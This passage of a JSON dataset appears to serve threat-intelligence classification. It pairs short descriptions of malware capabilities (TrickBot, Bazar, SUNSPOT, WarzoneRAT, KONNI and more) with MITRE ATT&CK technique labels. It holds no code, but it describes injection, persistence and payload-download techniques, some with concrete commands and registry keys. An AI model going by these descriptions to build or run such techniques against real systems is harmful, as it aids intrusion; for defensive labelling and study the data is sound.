    "text": "DarkWatchman can store configuration strings, keylogger, and output of components in the Registry.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "DarkWatchman can query the Registry to determine if it has already been installed on the system.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "DarkWatchman can collect the OS version, system architecture, uptime, and computer name.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "DarkWatchman has collected the username from a victim machine.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "DarkWatchman can use WMI to execute commands.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "AppleSeed can collect data on a compromised host.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "AppleSeed has the ability to search for .txt, .ppt, .hwp, .pdf, and .doc files in specified directories.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "AppleSeed has the ability to use multiple dynamically resolved API calls.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "AppleSeed can enumerate the current process on a compromised host.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "AppleSeed can identify the OS version of a targeted system.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "AppleSeed can identify the IP of a targeted system.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "UBoatRAT can upload and download files to the victim’s machine.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Skidmap has checked for the existence of specific files including /usr/sbin/setenforce and /etc/selinux/config. It also has the ability to monitor the cryptocurrency miner file and process.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Skidmap has the ability to download files on an infected host.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Skidmap has monitored critical processes to ensure resiliency.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "Skidmap has the ability to check whether the infected system’s OS is Debian or RHEL/CentOS to determine which cryptocurrency miner it should use.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Ecipekac can download additional payloads to a compromised host.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "HyperBro has the ability to run an application (CreateProcessW) or script/file (ShellExecuteW) via API.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "Grandoreiro can download its second stage from a hardcoded URL within the loader's code.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Grandoreiro can store its configuration in the Registry at HKCU\\Software\\ under frequently changing names including %USERNAME% and ToolTech-RM.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "Grandoreiro can execute through the WinExec API.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "Grandoreiro can identify installed security tools based on process names.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "Grandoreiro can collect the computer name and OS version from a compromised host.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Grandoreiro can determine the IP and physical location of the compromised host via IPinfo.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "Grandoreiro can collect the username from the victim's machine.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "Dridex has used the OutputDebugStringW function to avoid malware analysis as part of its anti-debugging technique.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "Dridex has collected the computer name and OS architecture information from the system.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "PlugX has a module to create, delete, or modify Registry keys.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "PlugX can use the Windows API functions GetProcAddress, LoadLibrary, and CreateProcess to execute another process.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "Rising Sun can enumerate information about files from the infected system, including file size, attributes, creation time, last access time, and write time. Rising Sun can enumerate the compilation timestamp of Windows executable files.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Rising Sun used dynamic API resolutions to various Windows APIs by leveraging LoadLibrary() and GetProcAddress().",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "Rising Sun can enumerate all running processes and process information on an infected machine.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "Rising Sun can detect the computer name, operating system, and other native system information.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Rising Sun can detect network adapter and IP address information.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "Rising Sun can detect the username of the infected host.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "TAINTEDSCRIBE can use DirectoryList to enumerate files in a specified directory.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "TAINTEDSCRIBE can download additional modules from its C2 server.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "TAINTEDSCRIBE can execute ProcessList for process discovery.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "TAINTEDSCRIBE can use DriveList to retrieve drive information.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "BlackEnergy gathers a list of installed apps from the uninstall program Registry. It also gathers registered mail, browser, and instant messaging clients from the Registry. BlackEnergy has searched for given file types.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "BlackEnergy has gathered a process list by using Tasklist.exe.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "BlackEnergy injects its DLL component into svchost.exe.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "BlackEnergy has gathered information about network IP configurations using ipconfig.exe and about routing tables using route.exe.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "Catchamas creates three Registry keys to establish persistence by adding a Windows Service.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "Catchamas gathers the Mac address, IP address, and the network adapter information from the victim’s machine.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "Carberp can download and execute new plugins from the C2 server.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Carberp has used the NtQueryDirectoryFile and ZwQueryDirectoryFile functions to hide files and directories.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "Carberp has collected a list of running processes.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "Carberp's bootkit can inject a malicious DLL into the address space of running processes.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Carberp has queued an APC routine to explorer.exe by calling ZwQueueApcThread.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Carberp has searched the Image File Execution Options registry key for \"Debugger\" within every subkey.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "Carberp has collected the operating system version from the infected system.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "TrickBot collects local files and information from the victim’s local machine.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "TrickBot searches the system for all of the following file extensions: .avi, .mov, .mkv, .mpeg, .mpeg4, .mp4, .mp3, .wav, .ogg, .jpeg, .jpg, .png, .bmp, .gif, .tiff, .ico, .xlsx, and .zip. It can also obtain browsing history, cookies, and plug-in information.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "TrickBot can modify registry entries.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "TrickBot uses the Windows API call, CreateProcessW(), to manage execution flow.[1] TrickBot has also used Nt* API functions to perform Process Injection.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "TrickBot uses module networkDll for process list discovery.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "TrickBot has used Nt* Native API functions to inject code into legitimate processes such as wermgr.exe.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "TrickBot injects into the svchost.exe process.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "TrickBot gathers the OS version, machine name, CPU type, amount of RAM available, and UEFI/BIOS firmware information from the victim’s machine.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "TrickBot obtains the IP address, location, and other relevant network information from the victim’s machine.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "TrickBot can identify the user and groups the user belongs to on a compromised host.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "Doki has resolved the path of a process PID to use as a script argument.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Doki has downloaded scripts from C2.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Doki has searched for the current process’s PID.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "Green Lambert can collect data from a compromised host.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "Green Lambert can use uname to identify the operating system name, version, and processor type.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Green Lambert can obtain proxy information from a victim's machine using system environment variables.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "HIDEDRV injects a DLL for Downdelph into the explorer.exe process.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "AppleJeus has collected the victim host information after infection.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "An older version of CHOPSTICK has a module that monitors all mounted volumes for files with the extensions .doc, .docx, .pgp, .gpg, .m2f, or .m2o.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "SDBbot has the ability to access the file system on a compromised host.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "SDBbot has the ability to get directory listings or drive information on a compromised host.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "SDBbot has the ability to download a DLL from C2 to a compromised host.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "SDBbot has the ability to inject a downloaded DLL into a newly created rundll32.exe process.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "SDBbot has the ability to identify the OS version, country code, and computer name.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "SDBbot has the ability to determine the domain name and whether a proxy is configured on a compromised host.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "SDBbot has the ability to identify the user on a compromised host.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "FALLCHILL can collect operating system (OS) version information, processor information, system name, and information about installed disks from the victim.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Cyclops Blink can upload files from a compromised host.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "Cyclops Blink can use the Linux API statvfs to enumerate the current working directory.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Cyclops Blink has the ability to download files to target systems.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Cyclops Blink can use various Linux API functions including those for execution and discovery.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "Cyclops Blink can enumerate the process it is currently running under.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "Cyclops Blink has the ability to query device information.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Cyclops Blink can use the Linux API if_nameindex to gather network interface names.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "SUNSPOT enumerated the Orion software Visual Studio solution directory path.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "SUNSPOT used Windows API functions such as MoveFileEx and NtQueryInformationProcess as part of the SUNBURST injection process.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "SUNSPOT monitored running processes for instances of MsBuild.exe by hashing the name of each running process and comparing it to the corresponding value 0x53D525. It also extracted command-line arguments and individual arguments from the running MsBuild.exe process to identify the directory path of the Orion software Visual Studio solution.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "Emissary has the capability to execute ver and systeminfo commands.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Emissary has the capability to execute the command ipconfig /all.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "RogueRobin checks the running processes for evidence it may be running in a sandbox environment. It specifically enumerates processes for Wireshark and Sysinternals.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "RogueRobin gathers the IP address and domain from the victim’s machine.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "RogueRobin collects the victim’s username and whether that user is an admin.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "Pteranodon has used various API calls.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "SideTwist has the ability to upload files from a compromised host.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "SideTwist has the ability to search for specific files.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "SideTwist has the ability to download additional files.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "SideTwist can use GetUserNameW, GetComputerNameW, and GetComputerNameExW to gather information.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "SideTwist can collect the computer name of a targeted system.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "SideTwist has the ability to collect the domain name on a compromised host.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "SideTwist can collect the username on a targeted system.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "Bazar can retrieve information from the infected machine.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "Bazar can enumerate the victim's desktop.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Bazar can download and deploy additional payloads, including ransomware and post-exploitation frameworks such as Cobalt Strike.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Bazar can use various APIs to allocate memory and facilitate code execution/injection.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "Bazar can identity the current process on a compromised host.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "Bazar can inject code through calling VirtualAllocExNuma.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Bazar can inject into a target process including Svchost, Explorer, and cmd using process hollowing.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Bazar can inject into a target process using process doppelgänging.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Bazar can query Windows\\CurrentVersion\\Uninstall for installed applications.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "Bazar can fingerprint architecture, computer name, and OS version on the compromised host. Bazar can also check if the Russian language is installed on the infected machine and terminate if it is found.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Bazar can collect the IP address and NetBIOS name of an infected machine.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "Bazar can identify the username of the infected user.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "Bazar can execute a WMI query to gather information about the installed antivirus engine.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "Azorult can download and execute additional files. Azorult has also downloaded a ransomware payload called Hermes.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Azorult can check for installed software on the system under the Registry key Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "Azorult can collect host IP information from the victim’s machine.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "Azorult can collect the username from the victim’s machine.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "Melcoz has the ability to download additional files to a compromised host.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Naid creates Registry entries that store information about a created service and point to a malicious DLL dropped to disk.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "Naid collects a unique identifier (UID) from a compromised host.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "RDAT can download files via DNS.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Torisma has used various Windows API calls.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "Torisma can use GetlogicalDrives to get a bitmask of all drives available on a compromised system. It can also use GetDriveType to determine if a new drive is a CD-ROM drive.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Torisma can collect the local MAC address using GetAdaptersInfo as well as the system's IP address.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "PoisonIvy creates a Registry subkey that registers a new system device.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "Avaddon has searched for specific files prior to encryption.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Avaddon modifies several registry keys for persistence and UAC bypass.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "Avaddon has used the Windows Crypto API to generate an AES key.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "Avaddon has collected information about running processes.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "Avaddon can collect the external IP address of the victim.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "Avaddon uses wmic.exe to delete shadow copies.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "VBShower has the ability to download VBS files to the target computer.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Nebulae has the capability to upload collected files to C2.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "Nebulae can list files and directories on a compromised host.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Nebulae can download files from C2.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Nebulae has the ability to use CreateProcess to execute a process.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "Nebulae can enumerate processes on a target system.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "Nebulae can discover logical drive information including the drive type, free space, and volume information.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "When it first starts, BADNEWS crawls the victim's local drives and collects documents with the following extensions: .doc, .docx, .pdf, .ppt, .pptx, and .txt.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "BADNEWS has a command to download an .exe and execute it via CreateProcess API. It can also run with ShellExecute.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "BADNEWS has a command to download an .exe and use process hollowing to inject it into a new process.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Nltest may be used to enumerate the parent domain of a local machine using /parentdomain.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "Cuba can enumerate files by using a variety of functions.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Cuba can download files from its C2 server.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Cuba has used several built-in API functions for discovery like GetIpNetTable and NetShareEnum.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "Cuba can enumerate processes running on a victim's machine.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "Cuba can enumerate local drives, disk type, and disk free space.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Cuba can retrieve the ARP cache from the local system by using GetIpNetTable.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "RCSession can collect data from a compromised host.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "RCSession has the ability to drop additional files to an infected machine.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "RCSession can write its configuration file to the Registry.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "RCSession can use WinSock API for communication including WSASend and WSARecv.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "RCSession can identify processes based on PID.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "RCSession can launch itself from a hollowed svchost.exe process.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "RCSession can gather system information from a compromised host.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "RCSession can gather system owner information, including user and administrator privileges.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "Drovorub can transfer files from the victim machine.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "Drovorub can download files to a compromised host.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "FoggyWeb can retrieve configuration data from a compromised AD FS server.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "FoggyWeb's loader can check for the FoggyWeb backdoor .pri file on a compromised AD FS server.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "FoggyWeb can receive additional malicious components from an actor controlled C2 server and execute them on a compromised AD FS server.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "FoggyWeb's loader can use API functions to load the FoggyWeb backdoor into the same Application Domain within which the legitimate AD FS managed code is executed.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "FoggyWeb's loader can enumerate all Common Language Runtimes (CLRs) and running Application Domains in the compromised AD FS server's Microsoft.IdentityServer.ServiceHost.exe process.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "WarzoneRAT can collect data from a compromised host.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "WarzoneRAT can enumerate directories on a compromise host.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "WarzoneRAT can download and execute additional files.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "WarzoneRAT can create HKCU\\Software\\Classes\\Folder\\shell\\open\\command as a new registry key during privilege escalation.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "WarzoneRAT can use a variety of API calls on a compromised host.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "WarzoneRAT can obtain a list of processes on a compromised host.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "WarzoneRAT has the ability to inject malicious DLLs into a specific process for privilege escalation.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "WarzoneRAT can collect compromised host information, including OS version, PC name, RAM size, and CPU details.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "ABK has the ability to download files from C2.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "ABK has the ability to inject shellcode into svchost.exe.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Backdoor.Oldrea collects information about available drives, default browser, desktop file list, My Documents, Internet history, program files, and root of available drives. It also searches for ICS-related software files.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Backdoor.Oldrea can download additional modules from C2.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Backdoor.Oldrea injects itself into explorer.exe.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Hildegard has downloaded additional scripts that build and run Monero cryptocurrency miners.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Hildegard has collected the host's OS, CPU, and memory information.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Crimson can set a Registry key to determine how long it has been installed and possibly to indicate the version number.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "Crimson can check the Registry for the presence of HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\last_edate to determine how long it has been installed on a host.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "Crimson contains a command to collect the victim PC name, disk drive information, and operating system.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Crimson can identify the user on a targeted system.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "Umbreon creates valid local users to provide access to the system.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Gold Dragon lists the directories for Desktop, program files, and the user’s recently accessed files.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Gold Dragon checks the running processes on the victim’s machine.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "Gold Dragon enumerates registry keys with the command regkeyenum and obtains information for the Registry key HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "ZxShell can transfer files from a compromised host.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "ZxShell can create Registry entries to enable services to run.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "ZxShell can leverage native API including RegisterServiceCtrlHandler to register a service.RegisterServiceCtrlHandler",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "Pandora can load additional drivers and files onto a victim machine.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Pandora can write an encrypted token to the Registry to enable processing of remote commands.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "Pandora can monitor processes on a compromised host.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "Pandora can start and inject code into a new svchost process.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "KONNI has stored collected information and discovered processes in a tmp file.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "KONNI can download files and execute them on the victim’s machine.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "KONNI has modified registry keys of ComSysApp, Svchost, and xmlProv on the machine to gain persistence.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "KONNI has hardcoded API calls within its functions to use on the victim's machine.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "KONNI has used the command cmd /c tasklist to get a snapshot of the current processes on the target machine.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
